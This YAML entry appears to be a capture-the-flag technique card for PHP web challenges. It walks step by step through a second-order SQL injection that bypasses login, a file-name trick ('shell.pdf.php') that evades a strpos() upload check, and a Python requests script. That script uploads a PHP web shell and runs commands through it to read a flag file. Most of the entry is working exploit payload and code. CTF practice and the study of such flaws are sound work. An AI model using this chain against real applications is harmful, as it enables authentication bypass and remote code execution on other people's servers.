name: second_order_sqli_file_upload_bypass
category: web
tags: [sqli, second_order_sqli, file_upload, bypass, php]
indicators:
  - "User input directly concatenated into SQL"
  - "First query result used in second query (second-order injection)"
  - "File upload uses strpos() to check filename contains string"

tricks:
  - name: "Step 1: Identify second-order SQL injection"
    when: "Analyze login logic"
    how: "First query returns username, second query uses it without sanitization"
    payload: |
      $check = mysqli_query("SELECT username FROM users WHERE username = '$input'");
      $usernamenew = $row['username'];  # From first query
      $sql = mysqli_query("SELECT user_id FROM users WHERE username = '$usernamenew'...");

  - name: "Step 2: Craft second-order injection payload"
    when: "Exploit SQLi"
    how: "UNION inject to return username containing SQL injection for second query"
    payload: |
      ' UNION SELECT CONCAT('admin',CHAR(39),' OR ',CHAR(39),'1',CHAR(39),'=',CHAR(39),'1',CHAR(39),' -- ')-- 
      # Returns: admin' OR '1'='1' -- 
      # Second query becomes: WHERE username = 'admin' OR '1'='1' --

  - name: "Step 3: Bypass file upload check"
    when: "Bypass file type check"
    how: "strpos('.pdf') only checks if filename contains .pdf, not suffix"
    payload: |
      shell.pdf.php  # Contains .pdf but ends with .php

  - name: "Step 4: Extract the flag"
    when: "Execute attack"
    how: "SQLi login bypass -> Upload webshell -> RCE"
    payload: |
      # SQLi bypass login
      payload = "' UNION SELECT CONCAT('admin',CHAR(39),' OR '...)-- "
      s.post(f"{TARGET}/index.php", data={"username": payload, "password": "x"})
      
      # Upload webshell
      files = {"invoice": ("shell.pdf.php", b"<?php system($_GET['cmd']); ?>", "application/pdf")}
      s.post(f"{TARGET}/upload.php", files=files)
      
      # Execute command
      resp = s.get(f"{TARGET}/uploaded_invoices/shell.pdf.php", params={"cmd": "cat /FLAG.txt"})
